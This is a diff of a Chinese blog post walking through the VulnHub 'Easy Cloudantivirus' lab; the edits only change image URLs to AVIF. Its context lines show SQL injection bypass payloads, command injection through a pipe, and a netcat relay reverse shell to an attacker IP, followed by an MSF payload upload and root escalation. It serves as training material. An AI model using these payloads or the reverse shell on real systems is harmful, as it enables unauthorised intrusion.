@@ -2,7 +2,7 @@
 title: VulnHub靶场 Easy Cloudantivirus
 description: VulnHub靶场 Easy Cloudantivirus WP
 pubDate: 10 19 2024
-image: https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-8.png
+image: https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-8.png?imageMogr2/format/avif
 categories:
   - 网络安全
 tags:
@@ -13,19 +13,19 @@ tags:
 
 进行二层发现
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-1.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-1.png?imageMogr2/format/avif)
 
 目标锁定 `192.168.135.205`，对其进行端口扫描，得到如下结果
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-2.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-2.png?imageMogr2/format/avif)
 
 在目标 IP 下的 8080 端口，有一个 Python 的 WEB 服务，访问页面得到如下结果
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-3.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-3.png?imageMogr2/format/avif)
 
 要求填写邀请码进行使用。进行 FUZZ 测试，在测试 `"` 的时候，出现的 sqlite3 报错
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-4.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-4.png?imageMogr2/format/avif)
 
 直接把代码爆出来了。
 
@@ -53,19 +53,19 @@ select * from code where password="' + " or 1=1# + '"
 
 即输入 `" or 1=1#`，进行尝试，结果如下
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-5.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-5.png?imageMogr2/format/avif)
 
 额……换个 `--` 注释试试
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-6.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-6.png?imageMogr2/format/avif)
 
 成功，返回了一个 `ls -l` 的命令结果。说明后端执行了命令，试试管道符
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-7.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-7.png?imageMogr2/format/avif)
 
 成功执行命令，我们借此可以反弹 shell，发现目标靶机自带 nc，尝试连接
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-8.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-8.png?imageMogr2/format/avif)
 
 失败了，可能是版本不对……，想到一个法子
 
@@ -75,32 +75,32 @@ nc 192.168.135.192 9999 | /bin/bash | nc 192.168.135.192 8888
 
 第一个的结果传递给 `/bin/bash`，然后再传递给第二个连接，这样不就另类的实现了 shell 嘛
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-9.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-9.png?imageMogr2/format/avif)
 
 成功。不过这样有点麻烦，直接传一个 MSF 马进去
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-10.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-10.png?imageMogr2/format/avif)
 
 成功喽。有一个数据库文件，下载下来，啥也没有。
 
 再进行信息收集的时候，发现在 `/home/scanner` 下，有一个可执行的，有 sudo 权限的，属主为 root 用户的 c 源文件
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-11.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-11.png?imageMogr2/format/avif)
 
 查看一下源码内容
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-12.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-12.png?imageMogr2/format/avif)
 
 这是一个更新脚本，要求传递两个参数，拿 nc 简单试试
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-14.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-14.png?imageMogr2/format/avif)
 
 查看反弹结果
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-13.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-13.png?imageMogr2/format/avif)
 
 成功得到 root 权限，然后再传 MSF 马，得到 root 权限的 MSF 后门
 
-![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-15.png)
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Easy%20Cloudantivirus/002%20Easy%20Cloudantivirus-15.png?imageMogr2/format/avif)
 
 成功拿到 root 权限
